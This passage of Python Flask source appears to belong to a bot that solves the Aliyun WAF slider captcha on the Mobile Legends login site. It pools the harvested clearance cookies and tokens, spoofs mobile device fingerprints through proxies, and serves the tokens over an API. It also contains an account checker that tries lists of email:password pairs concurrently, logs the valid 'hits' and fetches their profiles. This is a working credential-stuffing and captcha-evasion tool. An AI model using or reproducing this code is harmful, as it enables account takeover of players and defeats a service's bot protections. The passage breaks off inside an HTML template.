                    abort_var="__wafProbeAbort", timeout_ms=8000))
            except Exception:
                pass

            try:
                await page.wait_for_selector(
                    "#aliyunCaptcha-sliding-slider", timeout=3000)
                slider_appeared = True
            except Exception:
                slider_appeared = False

            if slider_appeared:
                ok, reason = await _solve_waf_in_page(page, ctx, wid)
                if ok:
                    for _ in range(15):
                        cookies = await _collect_cookies(ctx)
                        if any(k.startswith("acw") for k in cookies):
                            break
                        await asyncio.sleep(0.1)
                    break
            else:
                try:
                    names_lower = {k.lower() for k in (await _collect_cookies(ctx)).keys()}
                except Exception:
                    names_lower = set()
                if "acw_tc" in names_lower or "acw_sc__v2" in names_lower:
                    ok, reason = True, "acw_already_present"
                    break

            if attempt < 2:
                try:
                    await page.goto("about:blank", wait_until="commit", timeout=5000)
                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=15000)
                except Exception:
                    pass
                await asyncio.sleep(0.4)

        try:
            await page.evaluate(
                "()=>{try{if(window.__wafProbeAbort)window.__wafProbeAbort.abort()}catch(e){};"
                "delete window.__wafProbe; delete window.__wafProbeAbort;}")
        except Exception:
            pass

        if not slider_appeared and not ok:
            _spawn_rearm(ctx, page, wid, uses)
            return False, "probe_no_slider_no_cookie", sid, {}

        cookies = await _collect_cookies(ctx)
        if ok:
            for _ in range(20):
                names_lower = {k.lower() for k in cookies.keys()}
                if "acw_tc" in names_lower or "acw_sc__v2" in names_lower:
                    break
                await asyncio.sleep(0.1)
                cookies = await _collect_cookies(ctx)

        if ok:
            try:
                sess, proxy = _make_cffi_session(dev, cookies)
                _store_session(sid, dev, proxy, _make_ua(dev), sess)
            except Exception:
                pass

        _spawn_rearm(ctx, page, wid, uses)
        if not ok:
            return False, f"probe_{reason}", sid, cookies
        return True, None, sid, cookies
    except Exception as e:
        try:
            _spawn_rearm(ctx, page, wid, uses)
        except Exception:
            pass
        return None, f"probe_error:{type(e).__name__}:{str(e)[:120]}", None, {}

def _probe_sync():
    loop = _ensure_waf_loop()
    fut = asyncio.run_coroutine_threadsafe(_waf_probe_only(), loop)
    try:
        return fut.result(timeout=SOLVE_TIMEOUT_S + 15)
    except Exception as e:
        return None, f"timeout_or_error:{e}", None, {}

def _solve_and_login_sync(email, password, label=None, wid=0):
    loop = _ensure_waf_loop()
    fut = asyncio.run_coroutine_threadsafe(
        _solve_and_login(email, password, label=label, wid=wid), loop)
    try:
        return fut.result(timeout=SOLVE_TIMEOUT_S + 60)
    except Exception as e:
        return None, {}, f"timeout_or_error:{e}", None

# ─────────────────────────────────────────────────────────────
#  LEGACY PREFETCH (same inline pattern)
# ─────────────────────────────────────────────────────────────
_PREFETCH_QUEUE   = queue.Queue(maxsize=64)
_PREFETCH_TARGET  = int(os.getenv("WAF_PREFETCH_TARGET", "16"))
_PREFETCH_MAX_AGE = 50.0

async def _async_fetch_waf_via_browser():
    if not _HAS_BROWSER:
        return None, {}, "browser_not_available", None
    sid = uuid.uuid4().hex[:16]
    dev = random.choice(DEVICES)
    try:
        await _get_waf_browser()
        await _init_warm_pool()
        ctx, page, wid, uses = await _acquire_warm()
    except Exception as e:
        return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid

    fetch_js = _abortable_fetch_js(_dummy_payload(),
                                    var_name="__wafProbe",
                                    abort_var="__wafProbeAbort",
                                    timeout_ms=15000)
    try:
        try:
            await page.evaluate(fetch_js)
        except Exception:
            pass

        txt = ""
        drag_attempt = 0
        max_polls = int(SOLVE_TIMEOUT_S / 0.08) + 20

        for _ in range(max_polls):
            try:
                combined = await page.evaluate("""async()=>{
                    const slider = !!document.getElementById('aliyunCaptcha-sliding-slider');
                    if (slider) return {slider:true, res:'__PENDING__'};
                    if (!window.__wafProbe) return {slider:false, res:'__PENDING__'};
                    const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 50));
                    const res = await Promise.race([window.__wafProbe, t]);
                    return {slider:false, res};
                }""")
            except Exception:
                combined = {"slider": False, "res": "__PENDING__"}

            if combined.get("res") and combined["res"] != "__PENDING__":
                txt = combined["res"]
                break
            if combined.get("slider"):
                drag_attempt += 1
                if drag_attempt > MAX_DRAG_ATTEMPTS:
                    break
                await _solve_waf_in_page(page, ctx, wid)
                await asyncio.sleep(0.25)
                continue
            await asyncio.sleep(0.08)

        try:
            await page.evaluate(
                "()=>{try{if(window.__wafProbeAbort)window.__wafProbeAbort.abort()}catch(e){};"
                "delete window.__wafProbe; delete window.__wafProbeAbort;}")
        except Exception:
            pass

        cookies = await _collect_cookies(ctx)
        for _ in range(20):
            if any(k.startswith("acw") for k in cookies):
                break
            await asyncio.sleep(0.1)
            cookies = await _collect_cookies(ctx)

        try:
            sess, proxy = _make_cffi_session(dev, cookies)
            _store_session(sid, dev, proxy, _make_ua(dev), sess)
        except Exception:
            pass

        _spawn_rearm(ctx, page, wid, uses)

        if txt and txt.strip().startswith("{"):
            return txt, cookies, None, sid
        try:
            html = await page.content()
        except Exception:
            html = ""
        if not html:
            return None, cookies, "no_waf_clearance", sid
        return html, cookies, None, sid

    except Exception as e:
        try:
            _spawn_rearm(ctx, page, wid, uses)
        except Exception:
            pass
        return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid

def _fetch_waf_via_browser_sync():
    loop = _ensure_waf_loop()
    fut = asyncio.run_coroutine_threadsafe(_async_fetch_waf_via_browser(), loop)
    try:
        return fut.result(timeout=SOLVE_TIMEOUT_S + 60)
    except Exception as e:
        return None, {}, f"timeout_or_error:{e}", None

def _prefetch_worker(delay_startup=0.0):
    if delay_startup > 0:
        time.sleep(delay_startup)
    while True:
        try:
            if _PREFETCH_QUEUE.qsize() < _PREFETCH_TARGET:
                res = _fetch_waf_via_browser_sync()
                if res and res[0]:
                    _PREFETCH_QUEUE.put((res, time.time()))
                    print(f"  \033[96m[PREFETCH] +1 WAF session "
                          f"({_PREFETCH_QUEUE.qsize()}/{_PREFETCH_TARGET})\033[0m",
                          flush=True)
                else:
                    time.sleep(0.5)
            else:
                time.sleep(0.2)
        except Exception:
            time.sleep(0.5)

_prefetch_started = False
def _ensure_prefetch_pool():
    global _prefetch_started
    if not _prefetch_started:
        _prefetch_started = True
        for i in range(2):
            t = threading.Thread(target=_prefetch_worker, args=(i * 0.2,), daemon=True)
            t.start()

# ─────────────────────────────────────────────────────────────
#  ACCOUNT CHECKER
# ─────────────────────────────────────────────────────────────
def _check_account(email, password, nick=None, wid=0):
    txt, cookies, err, sid = _solve_and_login_sync(
        email, password, label=nick, wid=wid)
    if err:
        dbg(f"w{wid} {nick or email} → retry: {err}")
        return None

    kind, payload = _classify_result(txt or "")
    if kind == "valid":
        with waf_sessions_lock:
            info = waf_sessions.get(sid)
        profile = {}
        if info and (payload.get('u_asig') or payload.get('u_atoken')):
            try:
                profile = asyncio.run_coroutine_threadsafe(
                    _fetch_profile(info["sess"], info["ua"], info["dev"], cookies),
                    _ensure_waf_loop(),
                ).result(timeout=15)
            except Exception:
                profile = {}
        print(_format_hit(nick or email, profile, payload), flush=True)
        return (email, payload, profile)

    if kind == "invalid":
        dbg(f"w{wid} {nick or email} → invalid credentials")
        return None

    dbg(f"w{wid} {nick or email} → retry: {kind} {payload}")
    return None

def run_account_checker(path, workers=4, retries=3):
    accs = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) >= 2:
                accs.append((parts[0], parts[1],
                             parts[2] if len(parts) > 2 else parts[0]))

    if not accs:
        print(f"  \033[91m✗ No accounts in {path}\033[0m", flush=True)
        return [], []

    q = queue.Queue()
    for a in accs:
        q.put(a)

    hits, misses = [], []
    hits_lock = threading.Lock()

    def worker(wid):
        while True:
            try:
                email, pw, nick = q.get_nowait()
            except queue.Empty:
                return
            got = None
            for attempt in range(1, retries + 1):
                dbg(f"w{wid} {nick} try {attempt}/{retries}")
                got = _check_account(email, pw, nick=nick, wid=wid)
                if got:
                    break
                if attempt < retries:
                    dbg(f"w{wid} {nick} reloading page...")
                    time.sleep(0.4)
            with hits_lock:
                (hits if got else misses).append(nick)

    threads = [
        threading.Thread(target=worker, args=(i,), daemon=True, name=f"w{i}")
        for i in range(workers)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"\n  ✓ {len(hits)} hits, ✗ {len(misses)} misses", flush=True)
    if misses:
        print(f"  Misses: {', '.join(misses[:40])}"
              f"{'...' if len(misses) > 40 else ''}", flush=True)
    return hits, misses

# ─────────────────────────────────────────────────────────────
#  API ROUTES
# ─────────────────────────────────────────────────────────────

@app.route('/api/solve', methods=['POST'])
def api_solve():
    if not _HAS_BROWSER:
        return jsonify({'ok': False, 'error': 'browser_not_available',
                        'detail': 'pip install cloakbrowser'}), 503

    d = request.get_json(force=True, silent=True) or {}
    email    = d.get('email')
    password = d.get('password')
    probe_only = not (email and password)

    t0 = time.time()

    if probe_only:
        ok, err, sid, cookies = _probe_sync()
        dt_ms = int((time.time() - t0) * 1000)
        if err:
            return jsonify({'ok': False, 'error': err, 'sid': sid,
                            'timing_ms': dt_ms}), 502

        if not ok:
            return jsonify({
                'ok': True, 'result': 'waf_blocked', 'data': {},
                'cookies': cookies or {}, 'sid': sid,
                'timing_ms': dt_ms, 'raw_len': 0,
            })

        asig = f"waf_{sid}_{int(time.time() * 1000)}"
        _register_pool_entry(atoken=sid, asig=asig, cookies=cookies or {},
                             dev=None, sid=sid, synthetic=True)

        return jsonify({
            'ok': True, 'result': 'waf_clear', 'data': {},
            'cookies': cookies or {}, 'sid': sid,
            'u_asig': asig, 'u_atoken': sid,
            'timing_ms': dt_ms, 'raw_len': 0,
        })

    txt, cookies, err, sid = _solve_and_login_sync(email, password, label=email)
    dt_ms = int((time.time() - t0) * 1000)

    if err:
        return jsonify({
            'ok': False, 'error': err, 'sid': sid,
            'timing_ms': dt_ms, 'cookies': cookies,
        }), 502

    kind, payload = _classify_result(txt or '')
    if kind == 'valid' and isinstance(payload, dict):
        # Only register pool entries for token-based responses (legacy shape).
        # Session-based responses (guid+session) don't have tokens to pool.
        atoken = payload.get('u_atoken') or ''
        asig   = payload.get('u_asig')   or ''
        if asig:
            _register_pool_entry(atoken=atoken, asig=asig,
                                 cookies=cookies or {}, sid=sid)

    return jsonify({
        'ok': True, 'result': kind, 'data': payload,
        'cookies': cookies, 'sid': sid,
        'timing_ms': dt_ms, 'raw_len': len(txt or ''),
    })


@app.route('/api/waf')
def api_waf():
    if not _HAS_BROWSER:
        return jsonify({'ok': False, 'error': 'browser_not_available',
                        'detail': 'pip install cloakbrowser'}), 503

    _ensure_prefetch_pool()
    item = None
    now = time.time()
    while not _PREFETCH_QUEUE.empty():
        try:
            cand, ts = _PREFETCH_QUEUE.get_nowait()
            if (now - ts) <= _PREFETCH_MAX_AGE:
                item = cand
                break
        except queue.Empty:
            break

    if item is None:
        html, cookies, error_msg, sid = _fetch_waf_via_browser_sync()
    else:
        html, cookies, error_msg, sid = item

    if not html:
        return jsonify({'ok': False, 'error': 'fetch_failed',
                        'detail': error_msg or 'unknown'}), 502

    if sid:
        asig = f"waf_{sid}_{int(time.time() * 1000)}"
        _register_pool_entry(atoken=sid, asig=asig,
                             cookies=cookies or {}, sid=sid, synthetic=True)

    return jsonify({'ok': True, 'html': html, 'cookies': cookies, 'sid': sid})


@app.route('/api/token', methods=['POST'])
def api_recv_token():
    d = request.get_json(force=True)
    if d and d.get('u_asig'):
        sig = d['u_asig']
        sid = d.get('sid')
        dev_info = None
        if sid:
            with waf_sessions_lock:
                if sid in waf_sessions:
                    dev_info = waf_sessions[sid].get('dev')
        if dev_info:
            d['device']      = dev_info['model']
            d['impersonate'] = dev_info['imp']
            d['cv']          = dev_info['cv']
            d['brand']       = dev_info['brand']
            d['ver']         = dev_info['ver']
        if sid:
            with sig_to_sid_lock:
                sig_to_sid[sig] = sid
            with waf_sessions_lock:
                if sid in waf_sessions:
                    sess_upd = waf_sessions[sid].get('sess')
                    if sess_upd and isinstance(d.get('cookies'), dict):
                        try:
                            for k, v in d['cookies'].items():
                                if v:
                                    sess_upd.cookies.set(k, v, domain='mobilelegends.com')
                                else:
                                    sess_upd.cookies.set(k, v)
                            waf_sessions[sid]['ts'] = time.time()
                        except Exception:
                            waf_sessions[sid]['ts'] = time.time()
                    else:
                        waf_sessions[sid]['ts'] = time.time()
        added = _register_pool_entry(
            atoken=d.get('u_atoken') or '',
            asig=sig,
            cookies=d.get('cookies') or {},
            dev=dev_info, sid=sid,
        )
        if not added:
            _log(f"⚠ Duplicate token skipped: {sig[:20]}...", False)
            return jsonify({'ok': True, 'duplicate': True})
    return jsonify({'ok': True})


@app.route('/api/fail', methods=['POST'])
def api_recv_fail():
    global total_fail
    total_fail += 1
    _log("✗ Failed", False)
    return jsonify({'ok': True})


@app.route('/api/tokens')
def api_consume():
    _track_consumer(request.remote_addr)
    now = time.time()
    with lock:
        while token_pool and (now - token_pool[0].get('_added', now)) > TOKEN_EXPIRY:
            expired = token_pool.pop(0)
            _log(f"⏳ Token expired: {expired.get('u_asig','?')[:20]}...", False)
        if not token_pool:
            return jsonify({'error': 'empty'}), 503
        t = token_pool.pop(0)
        used_sigs.add(t.get('u_asig', ''))
    return jsonify({
        'u_atoken':    t.get('u_atoken', ''),
        'u_asig':      t.get('u_asig', ''),
        'cookies':     t.get('cookies', {}),
        'ts':          t.get('ts', 0),
        'device':      t.get('device', ''),
        'impersonate': t.get('impersonate', 'chrome'),
        'cv':          t.get('cv', ''),
        'brand':       t.get('brand', ''),
        'ver':         t.get('ver', ''),
        'sid':         t.get('sid') or sig_to_sid.get(t.get('u_asig', ''), None),
        'synthetic':   t.get('synthetic', False),
    })


@app.route('/api/token-url')
def api_consume_url():
    _track_consumer(request.remote_addr)
    now = time.time()
    with lock:
        while token_pool and (now - token_pool[0].get('_added', now)) > TOKEN_EXPIRY:
            expired = token_pool.pop(0)
            _log(f"⏳ Token expired: {expired.get('u_asig','?')[:20]}...", False)
        if not token_pool:
            return jsonify({'error': 'empty'}), 503
        t = token_pool.pop(0)
        used_sigs.add(t.get('u_asig', ''))
    atoken = t.get('u_atoken', '')
    asig   = t.get('u_asig', '')
    url    = f"{LOGIN_URL}/?u_atoken={atoken}&u_asig={asig}"
    return jsonify({
        'ok': True, 'url': url,
        'u_atoken': atoken, 'u_asig': asig,
        'cookies': t.get('cookies', {}), 'ts': t.get('ts', 0),
        'sid': t.get('sid') or sig_to_sid.get(asig, None),
        'synthetic': t.get('synthetic', False),
        'expires_in': max(0, int(TOKEN_EXPIRY - (now - t.get('_added', now)))),
    })


@app.route('/api/check', methods=['POST'])
def api_check():
    d = request.get_json(force=True)
    if not d or not d.get('sid') or not d.get('url') or not d.get('payload'):
        return jsonify({'ok': False, 'error': 'missing sid/url/payload'}), 400
    sid = d['sid']
    with waf_sessions_lock:
        info = waf_sessions.get(sid)
    if not info:
        return jsonify({'ok': False, 'error': 'session_expired'}), 410
    dev   = info['dev']
    proxy = info['proxy']
    ua    = info['ua']
    sess  = info.get('sess')
    if not sess:
        try:
            sess = Session(impersonate=dev['imp'], verify=False, proxies=proxy)
        except Exception as e:
            return jsonify({'ok': False, 'error': f'session_init: {e}'}), 500
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'https://mtacc.mobilelegends.com',
        'Referer': 'https://mtacc.mobilelegends.com/',
        'User-Agent': ua,
        'X-Requested-With': 'com.mobile.legends',
        'Connection': 'keep-alive',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
    headers.update(_make_sec_headers(dev))
    try:
        ck = []
        for c in sess.cookies:
            ck.append(f"{c.name}={c.value}")
        if ck:
            headers['Cookie'] = '; '.join(ck)
    except Exception:
        pass
    url     = d['url']
    payload = d['payload']
    try:
        r = sess.post(url, data=payload, headers=headers, timeout=15)
        raw = r.text
        if r.status_code == 405 or '<title>405</title>' in raw or 'aliyun_waf' in raw.lower():
            form_payload = json.loads(payload)
            form_data = {
                'op':     form_payload.get('op', ''),
                'sign':   form_payload.get('sign', ''),
                'params': json.dumps(form_payload.get('params', {}), separators=(',', ':')),
                'lang':   form_payload.get('lang', 'en'),
            }
            headers_f = dict(headers)
            headers_f['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            r2 = sess.post(url, data=form_data, headers=headers_f, timeout=15)
            return Response(r2.content, status=r2.status_code, content_type='application/json')
        return Response(r.content, status=r.status_code, content_type='application/json')
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)[:200]}), 502


@app.route('/api/sid-for-token', methods=['POST'])
def api_sid_for_token():
    d = request.get_json(force=True)
    if not d or not d.get('u_asig'):
        return jsonify({'ok': False, 'error': 'missing u_asig'}), 400
    sig = d['u_asig']
    with sig_to_sid_lock:
        sid = sig_to_sid.get(sig)
    if sid:
        with waf_sessions_lock:
            if sid in waf_sessions:
                waf_sessions[sid]['ts'] = time.time()
        return jsonify({'ok': True, 'sid': sid})
    return jsonify({'ok': False, 'error': 'no_sid_found'}), 404


@app.route('/api/kill', methods=['POST'])
def api_kill():
    with waf_sessions_lock:
        count = len(waf_sessions)
        waf_sessions.clear()
    while not _PREFETCH_QUEUE.empty():
        try:
            _PREFETCH_QUEUE.get_nowait()
        except Exception:
            break
    _log(f"KILL: flushed {count} stored sessions")
    return jsonify({'killed': count})


@app.route('/api/status')
def api_status():
    el = max(time.time() - t_start, 1)
    now = time.time()
    with lock:
        active = sum(1 for t in token_pool if (now - t.get('_added', now)) <= TOKEN_EXPIRY)
    warm_avail = _warm_queue.qsize() if _warm_queue is not None else 0
    return jsonify({
        'pool':  active, 'solved': total_ok, 'total_solved': total_ok,
        'failed': total_fail, 'used': len(used_sigs),
        'rate':  round(total_ok / (el / 60), 1),
        'uptime': int(el),
        'session_reset_s': SESSION_RESET_S,
        'warm_pages': warm_avail, 'warm_size': WARM_SIZE,
    })


@app.route('/api/monitor')
def api_monitor():
    if request.args.get('key', '') != MONITOR_KEY:
        return jsonify({'error': 'key'}), 403
    el = max(time.time() - t_start, 1)
    now = time.time()
    with lock:
        recent = list(token_pool[-10:])
        active_pool = sum(1 for t in token_pool if (now - t.get('_added', now)) <= TOKEN_EXPIRY)
        pool_ages = []
        for t in token_pool:
            age = now - t.get('_added', now)
            remaining = max(0, TOKEN_EXPIRY - age)
            pool_ages.append({'asig': t.get('u_asig', '')[:20],
                              'age': round(age, 1),
                              'remaining': round(remaining, 1)})
    with consumer_lock:
        consumers = []
        total_consumed = 0
        for ip, info in consumer_stats.items():
            consumers.append({
                'ip': ip, 'count': info['count'],
                'last': int(now - info['last']) if info['last'] else 0,
            })
            total_consumed += info['count']
        consumers.sort(key=lambda x: x['count'], reverse=True)
    success_rate = round((total_ok / max(total_ok + total_fail, 1)) * 100, 1)
    warm_avail = _warm_queue.qsize() if _warm_queue is not None else 0
    return jsonify({
        'solved': total_ok, 'failed': total_fail, 'pool': active_pool,
        'rate': round(total_ok / (el / 60), 1), 'uptime': int(el),
        'success_rate': success_rate, 'used': len(used_sigs),
        'total_consumed': total_consumed,
        'unique_consumers': len(consumers),
        'consumers': consumers[:20], 'pool_ages': pool_ages[:10],
        'token_expiry': TOKEN_EXPIRY,
        'session_reset_s': SESSION_RESET_S,
        'warm_pages': warm_avail, 'warm_size': WARM_SIZE,
        'log': logs[-50:], 'recent': recent,
    })


@app.route('/api/proxy', methods=['POST'])
def api_proxy():
    d = request.get_json(force=True)
    if not d or not d.get('sid') or not d.get('url'):
        return jsonify({'ok': False, 'error': 'missing sid/url'}), 400
    sid = d['sid']
    with waf_sessions_lock:
        info = waf_sessions.get(sid)
    if not info:
        return jsonify({'ok': False, 'error': 'session_expired'}), 410
    dev    = info['dev']
    proxy  = info['proxy']
    ua     = info['ua']
    sess   = info.get('sess')
    method = (d.get('method') or 'GET').upper()
    url    = d['url']
    body   = d.get('body')
    hdrs   = d.get('headers') or {}
    if not sess:
        try:
            sess = Session(impersonate=dev['imp'], verify=False, proxies=proxy)
        except Exception as e:
            return jsonify({'ok': False, 'error': f'session_init: {e}'}), 500
    req_headers = {
        'User-Agent': ua, 'Accept': '*/*',
        'Origin': 'https://g.alicdn.com',
        'Referer': 'https://g.alicdn.com/',
    }
    for k, v in hdrs.items():
        kl = k.lower()
        if kl not in ('user-agent', 'host', 'content-length', 'connection'):
            req_headers[k] = v
    req_headers.update(_make_sec_headers(dev))
    proxy_short = proxy['https'].split('@')[-1] if proxy else 'direct'
    try:
        if method == 'GET':
            r = sess.get(url, headers=req_headers, timeout=10)
        else:
            ct = hdrs.get('Content-Type') or hdrs.get('content-type') or 'application/json'
            req_headers['Content-Type'] = ct
            r = sess.post(url, headers=req_headers, data=body, timeout=10)
        print(f"  \033[95m⇄ Proxy {method} {url[:60]}... → {r.status_code} "
              f"(sid={sid}, proxy={proxy_short})\033[0m", flush=True)
        resp_headers = {}
        for k in ('content-type',):
            if k in r.headers:
                resp_headers[k] = r.headers[k]
        return Response(r.content, status=r.status_code, headers=resp_headers)
    except Exception as e:
        err = f"Proxy {method} failed: {type(e).__name__}: {e}"
        print(f"  \033[91m✗ {err}\033[0m", flush=True)
        return jsonify({'ok': False, 'error': err}), 502


# ─────────────────────────────────────────────────────────────
#  PAGE ROUTES
# ─────────────────────────────────────────────────────────────

@app.route('/')
def page_solver():
    return Response(SOLVER_HTML, content_type='text/html; charset=utf-8')


@app.route('/multi')
def page_multi():
    n = max(1, min(10, int(request.args.get('n', 4))))
    auto_reset = int(request.args.get('reset', 100))
    frames = ''.join(
        f'<iframe src="/" style="width:420px;height:520px;border:1px solid #333;margin:4px" id="f{i}"></iframe>'
        for i in range(n)
    )
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Solver ({n}x)</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0a0a;padding:8px;padding-top:40px;display:flex;flex-wrap:wrap;justify-content:center}}
#bar{{position:fixed;top:0;left:0;right:0;background:#111;color:#0f0;
font:13px monospace;padding:8px 16px;z-index:9999;display:flex;gap:12px;align-items:center;justify-content:center}}
#killBtn{{background:#c00;color:#fff;border:none;padding:4px 12px;border-radius:4px;cursor:pointer;font:12px monospace}}
#killBtn:hover{{background:#f00}}
</style></head>
<body><div id="bar">loading...</div>{frames}
<script>
(function(){{
  const N={n}, AUTO_RESET={auto_reset};
  let baseline=0, baselineSet=false;
  async function killReset(){{
    try{{ await fetch('/api/kill',{{method:'POST'}}); }}catch(e){{}}
    document.cookie.split(';').forEach(c=>{{
      const k=c.split('=')[0].trim();
      if(k) document.cookie=k+'=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
    }});
    try{{ localStorage.clear(); }}catch(e){{}}
    try{{ sessionStorage.clear(); }}catch(e){{}}
    for(let i=0;i<N;i++){{
      const f=document.getElementById('f'+i);
      if(f) f.src=f.src;
    }}
    baselineSet=false;
  }}
  window.killReset=killReset;
  setInterval(async()=>{{try{{
    const r=await fetch('/api/status');const j=await r.json();
    if(!baselineSet){{ baseline=j.solved; baselineSet=true; }}
    const batch=j.solved-baseline;
    document.getElementById('bar').innerHTML=
      '⚡ Solved: <b style="color:#0f0">'+j.solved+'</b> | '+
      'Fail: <b style="color:#f44">'+j.failed+'</b> | '+
      'Pool: <b style="color:#ff0">'+j.pool+'</b> | '+
      'Warm: <b style="color:#0af">'+(j.warm_pages||0)+'/'+(j.warm_size||0)+'</b> | '+
      'Batch: <b style="color:#0af">'+batch+'/'+AUTO_RESET+'</b> | '+
      j.rate+'/min | '+j.uptime+'s | '+
      '<span style="color:#bbb">Slots: <a href="/multi?n=2" style="color:#38bdf8">2x</a> <a href="/multi?n=4" style="color:#38bdf8">4x</a> <a href="/multi?n=6" style="color:#38bdf8">6x</a> <a href="/multi?n=8" style="color:#38bdf8">8x</a> <a href="/multi?n=10" style="color:#38bdf8">10x</a></span> '+
      '<button id="killBtn" onclick="killReset()">⚡ Kill & Reset</button>';
    document.title='S:'+j.solved+' B:'+batch+'/'+AUTO_RESET;
    if(AUTO_RESET>0 && batch>=AUTO_RESET){{
      killReset();
    }}
  }}catch(e){{}}}},2000);
}})();
</script></body></html>"""


@app.route('/monitor')
def page_monitor():
    if request.args.get('key', '') != MONITOR_KEY:
        return '<div style="font:20px monospace;padding:40px;color:#f44">❌ Invalid Key</div>', 403
    return Response(MONITOR_HTML, content_type='text/html; charset=utf-8')


# ─────────────────────────────────────────────────────────────
#  FRONTEND SOLVER PAGE
# ─────────────────────────────────────────────────────────────
SOLVER_HTML = r"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Solver</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#eee;font:12px monospace;overflow:hidden;height:100vh;display:flex;flex-direction:column}
#panel{background:#111;border-top:1px solid #333;padding:6px 10px;max-height:160px;overflow-y:auto;flex-shrink:0;flex:1}
#stats{background:#181818;padding:4px 10px;font-size:11px;color:#888;border-top:1px solid #222;flex-shrink:0;display:flex;gap:12px}
.sok{color:#0f0}.sfl{color:#f44}.swn{color:#ff0}.sinf{color:#0af}
</style></head><body>

<div id="stats">
  <span>Solved: <b class="sok" id="s-ok">0</b></span>
  <span>Failed: <b class="sfl" id="s-fl">0</b></span>
  <span>Session: <b class="sinf" id="s-sess">-</b></span>
  <span>Pool: <b class="swn" id="s-pool">0</b></span>
  <span id="s-state" class="swn">INIT</span>
  <span>Reset in: <b class="swn" id="s-reset">--</b></span>
  <span style="margin-left:auto">Mode: <a href="/multi?n=4" style="color:#38bdf8;text-decoration:none">⚡ Multi 4x</a> | <a href="/multi?n=10" style="color:#38bdf8;text-decoration:none">10x</a></span>
</div>
<div id="panel"></div>

<script>
(function(){
  const SESSION_RESET_MS = 120000;
  let sessionStart = Date.now();

  const panel = document.getElementById('panel');
  function slog(msg, cls){
    const d = document.createElement('div');
    d.className = cls || 'sok';
    d.textContent = '[' + new Date().toTimeString().slice(0,8) + '] ' + msg;
    panel.appendChild(d);
    panel.scrollTop = 1e9;
    if(panel.children.length > 100) panel.removeChild(panel.firstChild);
  }

  let myOk = 0, myFail = 0;
  const $ok    = document.getElementById('s-ok');
  const $fl    = document.getElementById('s-fl');
  const $sess  = document.getElementById('s-sess');
  const $pool  = document.getElementById('s-pool');
  const $state = document.getElementById('s-state');
  const $reset = document.getElementById('s-reset');

  function setState(s, cls){ $state.textContent = s; $state.className = cls || 'swn'; }

  setInterval(() => {
    if(!$reset) return;
    const remain = Math.max(0, Math.ceil((sessionStart + SESSION_RESET_MS - Date.now()) / 1000));
    $reset.textContent = remain + 's';
  }, 500);

  setInterval(async () => {
    try {
      const r = await fetch('/api/status');
      const j = await r.json();
      $pool.textContent = (j.pool || 0) + ' / ' + (j.solved || 0);
    } catch(e){}
  }, 1500);

  async function hardReset(){
    setState('RESETTING...','swn');
    slog('══ 2-min session reset ══','sinf');
    try{ await fetch('/api/kill',{method:'POST'}); }catch(e){}
    myOk = 0; myFail = 0;
    $ok.textContent = 0; $fl.textContent = 0;
    $sess.textContent = '-';
    await new Promise(r => setTimeout(r, 500));
    setState('READY','sok');
    slog('✓ Reset complete','sok');
  }

  async function solveOnce(){
    setState('SOLVING...','swn');
    let j;
    try{
      const r = await fetch('/api/solve', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({}),
      });
      if(!r.ok){
        let detail = '';
        try{ const e = await r.json(); detail = e.detail || e.error || ''; }catch(_){}
        throw new Error('HTTP '+r.status+(detail?' — '+detail:''));
      }
      j = await r.json();
    }catch(e){
      slog('solve error: '+e.message,'sfl');
      myFail++; $fl.textContent = myFail;
      fetch('/api/fail',{method:'POST'}).catch(()=>{});
      setState('FAILED ✗','sfl');
      return;
    }

    if(j.sid) $sess.textContent = j.sid.slice(0,16) + '...';
    slog('solve → ' + (j.result||'?') + ' (' + (j.timing_ms||0) + 'ms)', 'sinf');

    if(j.result === 'waf_clear'){
      myOk++; $ok.textContent = myOk;
      slog('✓ WAF CLEAR — registered (' + (j.timing_ms||0) + 'ms)', 'sok');
      setState('WAF OK ✓','sok');
    } else if(j.result === 'valid'){
      myOk++; $ok.textContent = myOk;
      slog('✓ Login OK (' + (j.timing_ms||0) + 'ms)', 'sok');
      setState('LOGIN OK ✓','sok');
    } else if(j.result === 'invalid'){
      myOk++; $ok.textContent = myOk;
      slog('✓ WAF passed (invalid creds) — blocked=FALSE', 'sok');
      setState('WAF OK ✓','sok');
    } else if(j.result === 'waf_blocked'){
      myFail++; $fl.textContent = myFail;
      slog('✗ WAF blocked', 'sfl');
      fetch('/api/fail',{method:'POST'}).catch(()=>{});
      setState('BLOCKED ✗','sfl');
    } else {
      myFail++; $fl.textContent = myFail;
      slog('✗ ' + (j.result||'error') + ' — ' + JSON.stringify(j.data||{}).slice(0,120), 'sfl');
      fetch('/api/fail',{method:'POST'}).catch(()=>{});
      setState('FAILED ✗','sfl');
    }
  }

  async function solveLoop(){
    while(true){
      if(Date.now() - sessionStart >= SESSION_RESET_MS){
        await hardReset();
        sessionStart = Date.now();
      }
      await solveOnce();
    }
  }

  slog('Solver ready — warm-pool architecture (probe registers sessions)','sok');
  solveLoop();
})();
</script>
</body></html>
"""


# ─────────────────────────────────────────────────────────────
#  MONITOR PAGE
# ─────────────────────────────────────────────────────────────
MONITOR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Monitor</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
